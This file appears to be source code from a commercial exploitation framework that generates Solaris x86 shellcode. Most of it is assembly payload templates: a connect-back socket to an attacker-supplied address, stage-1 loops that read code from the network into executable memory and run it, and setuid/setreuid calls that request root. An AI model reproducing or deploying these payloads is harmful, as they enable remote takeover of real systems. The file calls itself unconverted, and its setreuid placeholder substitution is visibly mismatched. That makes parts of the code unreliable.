#!/usr/bin/env python
"""
solarisx86shellcodegenerator.py

(c) Immunity, Inc. 2007


TODO:

These need to be converted from Linux to Solaris x86!!!

"""

from x86shellcodegenerator import X86, shellfunc
from exploitutils import *
from MOSDEF import mosdef, GetMOSDEFlibc


SYSCALL_NOTE="""
NOTE: We currently only appear to support 0x91 in MOSDEF/MOSDEFlibc/Solaris.py
so if any of the functionality mentioned in this is actually needed it will need
to be added. EOF.

Solx86 has multiple ways of making syscalls, depending on the hardware and kernel bitwidth. 
During boot, sol detects which is appropriate, and mounts the right libc on /lib/libc6...

different types of mechanism:
    - lcall 0x27 (classic sol)
    - lcall 0x7 (real old static bins)
    - int 0x91 (new standard base mechanism under sol 11, soon sol 10)
    - sysenter (new, intel)
    - syscall (new, amd64 longmode?)
   
Three different libcs, one for each mode. lcall is default, at boot, system 
picks which to used based on cpuid. The optimised ones are then loop mounted over the top of the real one.

                        | syscall | sysenter
64 bit kernel | Xeon    | u64     | u32
              | Opteron | u64, u32| - 
32 bit kernel | Xeon    |         | u32
              | Opteron |         | u32

Solaris 10 introduces new linker/loader hardware capabilities support. We have 
3 different versions of libc for Solaris x86, the old one we had before plus two new ones.

# /usr/lib/libc/libc_hwcap1.so.1: [SSE MMX CMOV SEP FPU]
# /usr/lib/libc/libc_hwcap2.so.1: [SSE2 SSE MMX CMOV AMD_SYSC FPU]

Now, in theory, LCALL should work everywhere, and noone seems to say what's up with Int91. 
However, while LCALL works for Metl on Intel 64bit, it does not work for Dave, which is bizarre. 

Hence, we implement a runtime syscall wrapper which CPUID's, and vectors through the right call method for 
the initial send_regs / read_exec loader. 
During this, the Solaris Mosdef shellserver retrieves the target's choice of syscall method, and uses that 
for future stuff, so as to save having to go through the wrapper every time in the future. You'll note that 
read_and_exec_loop gets an argument telling it which type of syscall to use. 

You can change the default syscall technique, or override the autodetection with self.syscallTechnique
and self.forceSyscall. 

-----
Obtaining CPUID info

CPUID instruction opcode is 0fh, 0a2h (two bytes). An argument is passed in EAX. The argument selects information that should be returned by CPUID.
Standard CPUID

This section describes CPUID as defined by Intel.
Entry: EAX=0

Exit:
EAX = maximum value of CPUID argument supported by the CPU (on early Intel 
Pentium sample chips EAX contained the CPU signature, described below, so its value was >500h.
EBX:EDX:ECX= vendor id string (EBX.lsb = first char, ECX.msb = last char).
NOTE: IDT processors may supply any vendor string when programmed appropriately, 
even "GenuineIntel" or "MyOwnGoodCPU". The proposed IDT identification routine is described below.
Entry: EAX = 1

Exit (for Intel CPUs only, others are similar but not the same!):
EAX = cpu id signature, currently bits 31..16 - unused, bits 15..12 - type (t), 
bits 11.8 - family (f), bits 7..4 - model (m), bits 3..0 - mask revision (r) .
Note: IDT and Cyrix family CPUs may fool you there.
EBX = 31..24 - default APIC ID, 23..16 - Logical processsor ID, 15..8 - CFLUSH 
chunk size , 7..0 - brand ID - available from Pentium III up
EDX = cpu feature flags - interpretation may depend on manufacturer and model, 
currently these bits are defined by Intel as follows:
  
  
isainfo -v tells you what information you're looking at here
if it says "sep" then you have sysenter support.

If you don't then it probably uses lcall 0x27
unless you're amd, in which case it uses syscall


TODO:
1. Check to see if the Adam Solaris VM can do sysenter. Can all Solaris 
x86 do Sysenter (on Intel - AMD isn't supported at all yet!)?
   Metl -- yes. Sysenter works on my intel. As does LCALL and INT91.

2. Switch the solarisx86shellcodegenerator to use self.finalize()
instead of the self.value+=X which it uses currently. This will allow
us to abstract out the whole syscall: function we are using now.
   Metl -- Uh, I implemented some madness, I fear in probably entirely the wrong way.
"""


class solaris_X86(X86):
    LCALL="lcall"
    SYSENTER="sysenter"
    SYSCALL="syscall"
    INT91="int91"
    # maps to returned by CPUID
    SYSCALL_TYPE={0:LCALL, 1:LCALL, 2:SYSCALL, 3:SYSENTER, 4:INT91}

    def __init__(self):
        # Set up default syscalltekneeq
        self.syscallTechnique=self.INT91
        self.forceSyscall=True # Set this to true to make us always use self.syscallTechnique

        X86.__init__(self)
        self.libc = GetMOSDEFlibc('Solaris', 'i386')
        self.defines = self.libc.getdefines()
        self.handlers["connect"] = self.connect
        self.handlers["createsocket"] = self.createsocket
        self.handlers["send_syscall_reg_read_and_exec_loop"] = self.send_syscall_reg_read_and_exec_loop
        self.handlers["known_fd_read_and_exec"] = self.known_fd_read_and_exec
        self.handlers["read_and_exec_loop"] = self.read_and_exec_loop
        self.handlers["read_and_exec"] = self.read_and_exec
        self.handlers["setreuid"] = self.setreuid
        self.handlers["setuid"] = self.setuid

    def initfuncs(self):
        syscall_lcall = shellfunc()

        syscall_lcall.code ="""
    syscall_lcall:
            pop %esi
            push %eax // extra unused argument
            // lcall  $0x27,$0x0
            .long 0x0000009a
            //.word 0x0027
            .byte 0x00
            .byte 0x27
            .byte 0x00
            addl $4,%esp // vape the one we pushed
            push %esi
            ret
        """
        syscall_lcall.docs = """ Pass arguments on stack in reverse order, syscall number in eax"""
        self.functions["syscall_lcall"] = syscall_lcall
        
        syscall_sysenter = shellfunc()
        syscall_sysenter.code="""
    syscall_sysenter:
    
            pop %esi
            // syscall entry arguments 
            // ecx points to arguments to the systemcall (esp)
            // edx points to systemcall return in usermode 
            // eax holds the systemcall numbers 
            push %eax
            movl %esp, %ecx
            call syscall_sysenter_getloc
            jmp syscall_sysenter_out
    syscall_sysenter_getloc_back:
            pop %edx
            sysenter
            // rets to addl below, jmping over the next instruction
    syscall_sysenter_getloc:
            jmp syscall_sysenter_getloc_back
    syscall_sysenter_out:
            addl $4,%esp
            push %esi
            ret
        """
        syscall_sysenter.docs = """Pass arguments on stack in reverse order, syscall number in eax"""
        self.functions["syscall_sysenter"] = syscall_sysenter
        
        syscall_int91 = shellfunc()
        syscall_int91.code="""
    syscall_int91:
            pop %esi
            push %eax
            int $0x91   // should just work with stack already setup, and syscall no in eax
            addl $4,%esp // vape the one we pushed
            push %esi
            ret
        """
        syscall_int91.docs = """ Pass arguments on stack in reverse order, syscall number in eax"""
        
        self.functions["syscall_int91"] = syscall_int91
        
        # Metl: Untested, cause causes SIGILL on my hardware. 
        syscall_syscall = shellfunc()
        syscall_syscall.code ="""
    syscall_syscall:
            pop %esi
            push %eax
            syscall      // nice and easy :)
            addl $4,%esp // vape the one we pushed
            push %esi
            ret
        """
        syscall_syscall.docs = """ Pass arguments on stack in reverse order, syscall number in eax"""
        self.functions["syscall_syscall"] = syscall_syscall

        cpuid = shellfunc()
        cpuid.doc = """This assembly function returns:
            0: No CPUID available
            1: No syscall, no sysenter
            2: Syscall available
            3: Sysenter available
            4: Int91 (No check for this, currently will never return this, but int91 does work, it seems)

            Docs say we should also check the vendor string, but uh, in theory, by ordering our
            checks right,we dont need to. I think. Which given that I think we should just be able
            to use LCALL all the damn time anyway... :(
        """
        
        cpuid.code="""
        // First, check that CPUID is even available. flags bit21 is 
        // writable if CPUID is available
    cpuid_check:
        pushfd
        pop %eax
        mov %eax,%ebx
        xor $0x00200000, %eax
        push %eax
        popfd
        pushfd
        pop %eax
        cmp %eax,%ebx
        jz no_cpuid
    sysenter_check:
        movl $1,%eax
        cpuid
        movl $0x800, %eax
        test %edx, %eax
        jnz have_sysenter
    syscall_check:
        movl $0x80000001, %eax
        cpuid
        movl $0x800, %eax
        test %edx, %eax
        jnz have_syscall

    have_nothing:
        movl $1,%eax
        ret

    have_sysenter:
        movl $3,%eax
        ret

    have_syscall:
        movl $2,%eax
        ret

    no_cpuid:
        xorl %eax,%eax
        ret

        """
        self.functions["get_cpuid"] = cpuid

        auto_cpuid_syscall = shellfunc()
        auto_cpuid_syscall.docs = """
            Pass in a syscall number in eax, and arguments on the stack. Calls CPUID to decide
            what sort of syscal mechanism to use, then does it. 
        """

        if self.forceSyscall:
            
            auto_cpuid_syscall.code = """
    auto_cpuid_syscall:
        jmp %s
""" % ("syscall_" + self.syscallTechnique)
            auto_cpuid_syscall.required.append("syscall_" + self.syscallTechnique)
            
        else:
            auto_cpuid_syscall.required.append("get_cpuid")
            for s in [self.LCALL, self.SYSCALL, self.SYSENTER, self.INT91]:
                
                auto_cpuid_syscall.required.append("syscall_" + s)
            auto_cpuid_syscall.code = """
    auto_cpuid_syscall:
        pushl %eax
        call cpuid_check
        mov %eax,%ebx
        popl %eax       //set up eax with syscall number

        cmp $0,%ebx     //no cpuid, use lcall
        je do_lcall
        cmp $1,%ebx
        je do_lcall     // have cpuid, but no sysjmp end_cpuid_syscall/call
        cmp $2,%ebx     // have syscall
        je do_syscall
        cmp $3,%ebx     // have sysenter
        je do_sysenter

                        // fall through to lcall

        do_lcall:
            jmp syscall_lcall
        do_syscall:
            jmp syscall_syscall
        do_sysenter:
            jmp syscall_sysenter
        do_int91:
            jmp syscall_int91

        """
            
        
    
        self.functions["auto_cpuid_syscall"] = auto_cpuid_syscall
        
    def send_syscall_reg_read_and_exec_loop(self, args):
        """
        Sends an integer describing the type of syscalls available back, along with a register, then reads and execs
        """

        code = """
        // this needs a rewrite ... bodged up to work with non-blocking sockets
        
        pushl %FDREG // save fd
        call cpuid_check // get cpuid
        popl %FDREG // restore fd
        
        pushl %FDREG // fd
        pushl %eax // syscall id
        movl %esp,%esi // ptr to id/fd data
   
        // send [syscallid][fdval] .. 8 bytes
        xorl %eax,%eax
        pushl %eax //flags of zero
        movb $8,%al
        pushl %eax //length of 8
        pushl %esi //message 
        pushl %FDREG // fd to send on
        movb $240,%al // send(2)
        pushl %eax // bogus save
        int $0x91 
        popl %eax // bogus restore
        addl $16,%esp //reset stack pointer

do_mmap:

        xorl %eax,%eax
        
        pushl %eax // off
        pushl $-1 // fildes -1
        pushl $0x102 // flags MAP_PRIVATE|MAP_ANON
        pushl $0x7 // prot: PROT_READ|PROT_WRITE|PROT_EXEC
        pushl $0x100000 // size
        pushl %eax // addr
        
        movl $SYS_mmap,%eax
        pushl %eax // save bogus val
        int $0x91
        cmpl $-1,%eax
        je exityo
        popl %ebx // restore bogus val
        addl $24,%esp // restore esp

        popl %FDREG
        popl %FDREG // restore FDVAL
        
        // save ptrs .. one for inc .. one for calling
        pushl %eax
        pushl %eax

poll_len:

        // { int fd; short events; short revents; }
        pushl $0x00000040 // high is events, low is revents
        pushl %FDREG
        movl %esp,%esi // esi points to poll struct
        
        pushl $-1 // timeout
        pushl $1 // nfds
        pushl %esi // fd event array
        
        pushl %edi // bogus save
        movl $SYS_poll,%eax
        int $0x91
        popl %edi // bogus restore
        addl $12,%esp // restore esp
        cmpl $-1,%eax
        je exityo
        
        popl %FDREG // pop fd val to restore stack
        popl %eax // get events/revents
        
        andl $0x00400000,%eax
        cmpl $0x00400000,%eax // check revents
        jne poll_len
        
        // at this point the fd moves to esi
        
        mov %FDREG,%esi
        push %esi // save fd
        
        // %esi has our fd 
        xorl %eax,%eax
        xorl %edx,%edx
        xorl %edi,%edi
        push %eax // buffer for 4 bytes to read into
        movl %esp,%edi // addr of buffer in edi
        
        // read the first 4 bytes..len value
        movb $4,%al
        push %eax // len of 4
        push %edi // buffer for 4 bytes
        push %esi // fd
        
        movb $3,%al // read
        pushl %edi
        int $0x91
        popl %edi
        movl (%edi),%edi // stash len to read in edi
        addl $16,%esp // clean up stack
        
        popl %esi // restore fd to canvas into esi
        
        cmp $0x4, %eax
        jne exityo

readexecloop:

        push %edi // save len to read

poll_code:

        // { int fd; short events; short revents; }
        pushl $0x00000040 // high is events, low is revents
        pushl %esi
        movl %esp,%edi // edi points to poll struct
        
        pushl $-1 // timeout
        pushl $1 // nfds
        pushl %edi // fd event array
        
        pushl %esi // save fd
        movl $SYS_poll,%eax
        int $0x91
        popl %esi // restore fd
        addl $12,%esp // restore esp
        cmpl $-1,%eax
        je exityo
        
        popl %esi // pop fd val to restore stack
        popl %eax // get events/revents
        
        andl $0x00400000,%eax
        cmpl $0x00400000,%eax // check revents
        jne poll_code
        
        // do the read
        
        popl %edi // restore len value
        popl %eax // restore ptr to read into
        pushl %eax // save it again
        pushl %edi
        
        push %edi // len to read
        push %eax // ptr to buffer to read into 
        push %esi // fd to read from
        movl $3,%eax // read syscall no
        pushl %esi // save fd
        int $0x91
        popl %esi // restore fd
        addl $12,%esp // cleaup stack

        cmpl $-1,%eax // check for return of -1, oh noes
        je exityo

        popl %edi // restore saved len
        
        cmpl %edi,%eax
        je execute
        
        subl %eax,%edi //decrement counter
        movl (%esp),%ebx // get ptr to current place in buffer
        addl %eax,%ebx // increment ptr
        movl %ebx,(%esp) // save it
        pushl %edi // save len counter
        jmp poll_code // go back to read rest of code

execute:
        // jmp to execute .. ebx has the fd
        mov %esi,%FDREG
        movl 4(%esp),%eax // get ptr to mmapped space
        movl %eax,(%esp) // reset the increment ptr to start of mmapped space
        
        pushl %FDREG // save the FDREG
        call *%eax // call the incoming code ...
        popl %FDREG // restore the FDREG .. going back to poll
        
        // back into MOSDEF len poll ...
        jmp poll_len

exityo:
        xorl %eax,%eax
        push %eax
        movb $1,%al   // rexit
        pushl %eax
        int $0x91
        // and never return...

        """

        code = code.replace("FDREG", args["fdreg"])
        code = code.replace('SYS_poll', "%d"% int(self.defines['SYS_poll']))
        code = code.replace('SYS_mmap', "%d"% int(self.defines['SYS_mmap']))

        self.code += code
        self.requireFunctions(["get_cpuid", "auto_cpuid_syscall"])

        return

    def sendreg(self, args):
        """
        Calls send() to send 4 bytes of reg value in little
        endian order to the socket which is in args["fdreg"]
        args[regtosend] and args[fdreg] cannot be eax, ecx
        ESP would also be nonesense in this context

        After this is finished, it leaves the fd in FDREG
        """

        code="""
        pushl %FDREG
        pushl %REGTOSEND
        xorl %eax,%eax
        pushl %eax //flags of zero
        movb $4,%al
        pushl %eax //length of 4
        leal 8(%esp),%ecx
        pushl %ecx //message 
        pushl %FDREG
        movb $240,%al // send(2)
        call SYSCALLWRAPPER
        addl $20,%esp //reset stack pointer
        popl %FDREG
        """
        code=code.replace("REGTOSEND",args["regtosend"])
        code=code.replace("FDREG",args["fdreg"])
        code=code.replace("SYSCALLWRAPPER", self.libc.syscallArgToLabel(args["syscall"]))
        self.requireFunctions(self.libc.syscallArgToLabel(args["syscall"]))
        self.code+=code
        return

    def dup2(self, args):
        """ fcntl dup2 from/to """
        code = """
        // dup2 - fcntl(fd, F_DUP2FD, 0) F_DUP2FD is 9
        pushl $NEWFD
        pushl $F_DUP2FD
        pushl $OLDFD
        movl $62,%eax
        int $0x91
        jnz dup2_success
        int3
dup2_success:
        """
        code = code.replace('NEWFD', "%d"% int(args['newfd']))
        code = code.replace('OLDFD', "%d"% int(args['oldfd']))
        code = code.replace('F_DUP2FD', "%d"% int(self.defines['F_DUP2FD']))
        self.code += code

    def known_fd_read_and_exec(self, args):
        """ a mosdef read/exec from a known fd val (stage1 payload e.g. xfs fd is 5) """

        code = """
        // not optimised .. has duplicate code
        
        jmp main
error:
        int3
        
main:
        // write GOOO on fd for trigger acknowledge
        xorl %eax,%eax
        movb $0x04,%al
        pushl $0x4F4F4F47
        movl %esp,%ebx
        pushl %eax
        pushl %ebx
        movb $FD,%al
        pushl %eax
        movl $SYS_write,%eax
        pushl %eax // bogus save
        int $0x91
        popl %ebx

        xorl %eax,%eax
        pushl %eax // off
        pushl $-1 // fildes -1
        pushl $0x102 // flags MAP_PRIVATE|MAP_ANON
        pushl $0x7 // prot: PROT_READ|PROT_WRITE|PROT_EXEC
        pushl $0x1000 // small mmap as this is supposed to be stage1 exploit payload
        pushl %eax // addr
        
        movl $SYS_mmap,%eax
        pushl %eax // save bogus val
        int $0x91
        cmpl $-1,%eax
        je error
        popl %ebx // restore bogus val
        addl $24,%esp // restore esp

        movl %eax,%edi // mmap ret
        
        // poll (assuming non-blocking)
poll_len:
        // { int fd; short events; short revents; }
        pushl $0x00000040 // low word is events, high word is revents
        pushl $FD
        movl %esp,%esi // esi points to poll struct
        
        pushl $-1 // timeout
        pushl $1 // nfds
        pushl %esi // fd event array
        
        pushl %edi // save mmap ret
        movl $SYS_poll,%eax
        int $0x91
        popl %edi // restore mmap ret
        addl $12,%esp // restore esp
        cmpl $-1,%eax
        je error
        
        popl %ebx // pop fd val to restore stack
        popl %eax // get events/revents
        
        andl $0x00400000,%eax
        cmpl $0x00400000,%eax // check revents
        jne poll_len
        
        // read size .. read code .. exec
read_size:

        pushl $4
        pushl %edi // read len into mmapped space
        pushl $FD

        pushl %edi // save mmap ret
        movl $SYS_read,%eax
        int $0x91
        cmpl $-1,%eax
        je error
        popl %edi // restore mmap ret
        addl $12,%esp // restore esp
        
        // poll (assuming non-blocking)
poll_code:

        // { int fd; short events; short revents; }
        pushl $0x00000040 // high is events, low is revents
        pushl $FD
        movl %esp,%esi // esi points to poll struct
        
        pushl $-1 // timeout
        pushl $1 // nfds
        pushl %esi // fd event array
        
        pushl %edi // save mmap ret
        movl $SYS_poll,%eax
        int $0x91
        popl %edi // restore mmap ret
        addl $12,%esp // restore esp
        cmpl $-1,%eax
        je error
        
        popl %ebx // pop fd val to restore stack
        popl %eax // get events/revents
        
        andl $0x00400000,%eax
        cmpl $0x00400000,%eax // check revents
        jne poll_code

read_code:

        movl (%edi),%ecx // get len val from mmap space
        
        // read into mmap space
        pushl %ecx
        pushl %edi
        pushl $FD
        
        movl $SYS_read,%eax
        pushl %edi // save mmap ret val
        int $0x91
        cmpl $-1,%eax
        je error
        popl %edi // restore mmap ret val
        addl $12,%esp // restore esp
        
execute_code:
        // save fd into %ebx for node startup known reg
        movl $FD,%ebx
        
        // execute .. normally this will come from a node.startup() .. so send_syscall_reg_read_and_exec
        jmp *%edi
        """
        code = code.replace('FD', "%d"% int(args['fd']))
        code = code.replace('SYS_mmap', "%d"% (self.defines['SYS_mmap']))
        code = code.replace('SYS_read', "%d"% (self.defines['SYS_read']))
        code = code.replace('SYS_write', "%d"% (self.defines['SYS_write']))
        code = code.replace('SYS_poll', "%d"% (self.defines['SYS_poll']))

        self.code = code # this is standalone stage 1 payload using int $0x91
        return

    def read_and_exec(self,args):
        """
        Reads in a little endian word of data, then reads in that much shellcode
        then jumps to it

        requires the register that has the socket handle in it to be args["fdreg"]
        
        """

        code="""
        readexec:
            """
        if args["fdreg"]!="esi":
            code+="""
            //.byte 0xcc
            mov %FDREG,%esi
            """

        code+="""
        mov %esi, FDSPOT(%ebx)
        // %esi has our fd 
        xorl %eax,%eax
        xorl %edx,%edx
        xorl %edi,%edi
        push %eax       // buffer for 4 bytes to read into
        movl %esp,%edi  // addr of buffer in edi
        // read the first 4 bytes..len value
        movb $4,%al
        push %eax       // len of 4
        push %edi       // buffer for 4 bytes
        push %esi       // fd
        movb $3,%al   // read
        call auto_cpuid_syscall
        movl (%edi),%edi  //stash len to read in edi
        addl $16,%esp   // clean up stack
        
        cmp $0x4, %eax
        //je exit
        jne exityo

        // wanna read into pcloc
        jmp read_here
getmyloc:

        popl %eax
        addl $0x1000,%eax
        push %eax           // save ptr to code for exec tiem
        push %eax           // save ptr to inc as we read 

readexecloop:
        push %edi           // len to read
        push %eax           // ptr to buffer to read into 
        push FDSPOT(%ebx)           // fd to read from
        movl $3,%eax        // read syscall no
        call auto_cpuid_syscall
        addl $12,%esp   // cleaup stack

        cmpl $-1,%eax     // check for return of -1, oh noes
        je exityo

        cmpl %edi,%eax
        je execute
        subl %eax,%edi      //decrement counter
        movl (%esp),%ebx    // get ptr to current place in buffer
        addl %eax,%ebx       // increment it
        movl %eax,(%esp)
        jmp readexecloop

execute:
        // jmp to execute .. ebx has the fd
        mov FDSPOT(%ebx),%FDREG
        mov %FDREG, %ebx // send_syscall_read_and_exec_loop expects the fd in ebx
        addl $4,%esp
        pop %eax
        jmp *%eax     // pointer to code loc should be top of stack... I hope.
                
exityo:
        xorl %eax,%eax
        push %eax
        movb $1,%al   // rexit
        call auto_cpuid_syscall
        // and never return...

read_here:
        call getmyloc
        """
        code=code.replace("FDREG",args["fdreg"])
        self.requireFunctions("auto_cpuid_syscall")
        self.addVariable("FDSPOT", long)
        self.code+=code

        return

    def read_and_exec_loop(self,args):
        """
        Reads in a little endian word of data, then reads in that much shellcode
        then calls it

        requires the register that has the socket handle in it to be args["fdreg"]
        
        """
        #print "Yo3"
        code="""
begin:
        xorl %eax,%eax
        xorl %edx,%edx
        xorl %edi,%edi
        push %eax       // buffer for 4 bytes to read into
        movl %esp,%edi  // addr of buffer in edi
        // read the first 4 bytes..len value
        movb $4,%al
        push %eax       // len of 4
        push %edi       // buffer for 4 bytes
        push %FDREG
        movb $3,%al     // read
        push %eax       // necessary garbage
        int $0x91
        #call SYSCALLWRAPPER
        movl (%edi),%edi  //stash len to read in edi
        addl $20,%esp     // clean up stack

        cmp $0x4, %eax
        //je exit
        jne exityo

        // wanna read into pcloc
        jmp read_here
getmyloc:

        popl %eax
        addl $0x1000,%eax
        push %eax           // save ptr to code for exec tiem
        push %eax           // save ptr to inc as we read 

readexecloop:
        push %edi           // len to read
        push %eax           // ptr to buffer to read into 
        push %FDREG         // fd to read from
        movl $3,%eax        // read syscall no
        push %edi           // garbage
        int $0x91
        #call SYSCALLWRAPPER
        addl $16,%esp       // cleanup stack

        cmpl $-1,%eax     // check for return of -1, oh noes
        je exityo
        cmpl $0,%eax     // check for 0 len read, oh noes
        je exityo

        cmpl %edi,%eax
        je execute
        subl %eax,%edi      // decrement counter
        movl (%esp),%ebx    // get ptr to current place in buffer
        addl %eax,%ebx      // increment it
        movl %eax,(%esp)
        jmp readexecloop

execute:
        mov %FDREG, %ebx
        addl $4,%esp
        pop %eax
        call %eax
        jmp begin 
                
exityo:
        xorl %eax,%eax
        push %eax
        movb $1,%al   // rexit
        int $0x91
        //call SYSCALLWRAPPER
        // and never return...

read_here:
        call getmyloc
        """

        code=code.replace("FDREG", str(args["fdreg"]))
        code=code.replace("SYSCALLWRAPPER", self.libc.syscallArgToLabel(args["syscallType"]))
        self.requireFunctions(self.libc.syscallArgToLabel(args["syscallType"]))

        self.code+=code
        return

    def createsocket(self,args):
        """
        Calls socket() and leaves result in eax
        
        Does not add to self.value, instead, returns result in code
        """
        IPPROTO_IP=0
        SOCK_DATAGRAM=17 #make sure this is right.

        if "protocol" in args:
            protocol=args["protocol"]
        else:
            protocol=IPPROTO_IP
        if "type" in args:
            type=args["type"]
        else:
            type=self.libc.getdefine('SOCK_STREAM')
        if "domain" in args:
            domain=args["domain"]
        else:
            domain=self.libc.getdefine('AF_INET')
            
        syscall_type = args["syscallType"]
        
        code="""
        //.byte 0xcc
        pushl %ebx //save off ebx
        pushl %ecx
                
        push $1
        push $0
        push $PROTOCOL
        push $TYPE
        push $DOMAIN
        push $0
        movl $SYSCALLNUMBER, %eax
        int $0x91
        
        addl $24, %esp
        popl %ecx //restore ecx
        popl %ebx //restore ebx
        """

        code=code.replace("PROTOCOL",str(protocol))
        code=code.replace("TYPE",str(type))
        code=code.replace("DOMAIN",str(domain))
        code=code.replace("SYSCALLNUMBER",str(self.defines["SYS_so_socket"]))
        #code=code.replace("SYSCALLWRAPPER", self.libc.syscallArgToLabel(syscall_type))
        return code

    def connect(self,args):
        """
        Connectback code
        Leaves current socket FD in esi
        leaves result in esi (not eax which has result of connect())
        """
        if "ipaddress" not in args:
            print "No ipaddress passed to connect!!!"
        if "port" not in args:
            print "no port in args of connect"
        ipaddress=args["ipaddress"]
        port=args["port"]
        syscall_type = args["syscallType"]    
        socketcode=self.createsocket({"ipaddress" : ipaddress,
                                      "port" : port, 
                                      "syscallType" : syscall_type})
        connectcode="""
        //push addrlen=16 
        //eax is a socket fd from socket()
        //.byte 0xcc
        pushl %eax
        pushl %ecx //save ecx
        pushl %ebx //save ebx
        
        pushl $IPADDRESS
        pushw $PORT
        pushw $2
        mov %esp, %ecx
        push $2
        push $16
        push %ecx
        push %eax
        push $62
        movl $SYSCALLNUMBER, %eax
        int $0x91
        
        addl $28, %esp

        popl %ebx //restore ebx
        popl %ecx //restore ecx
        //eax has the result...0 means success
        popl %esi
        """
        connectcode=connectcode.replace("IPADDRESS", uint32fmt(istr2int(socket.inet_aton(socket.gethostbyname(ipaddress)))))
        connectcode=connectcode.replace("PORT", uint16fmt(byteswap_16(int(port))))
        connectcode=connectcode.replace("SYSCALLNUMBER",str(self.defines["SYS_connect"]))
        #connectcode=connectcode.replace("SYSCALLWRAPPER", self.libc.syscallArgToLabel(syscall_type))
        self.code += socketcode+connectcode
        return

    def setuid(self,args):
        """Calls setuid(uid) """
        
        code="""
        xorl %eax,%eax 
        """
        
        if args == None:
            id = 0
        else:
            id = args["uid"]
        
        if id == 0:
            code += """
            pushl %eax
            """
        else:
            code+="""
            pushl $ID
            """
            
        code += """    
        pushl $0x0 // No idea what this extra param is for
        movb $SYSCALLNUMBER,%al
        int $0x91        
        """
        
        code = code.replace("ID", "%d" % id)
        code = code.replace("SYSCALLNUMBER", str(self.defines["SYS_setuid"]))
        self.code += code

    def setreuid(self,args):
        """Calls setreuid(ruid,euid) """
        
        code="""
        xorl %eax,%eax 
        """
        
        if args == None:
            id0 = 0
            id1 = 0
        else:
            id0 = args["ruid"]
            id1 = args["euid"]
            
        if id1 == 0:
            code += """
            pushl %eax
            """
        else:
            code += """
            pushl $ID1
            """

        if id0 == 0:
            code += """
            pushl %eax
            """
        else:
            code += """
            pushl $ID0
            """

        code+="""
        pushl $0x0 // Ignored param?
        movb $SYSCALLNUMBER,%al
        int $0x91
        """

        code = code.replace("SYSCALLNUMBER", str(self.defines["SYS_setreuid"]))
        code = code.replace("ID1",str(id0)).replace("ID2",str(id1))
        self.code += code
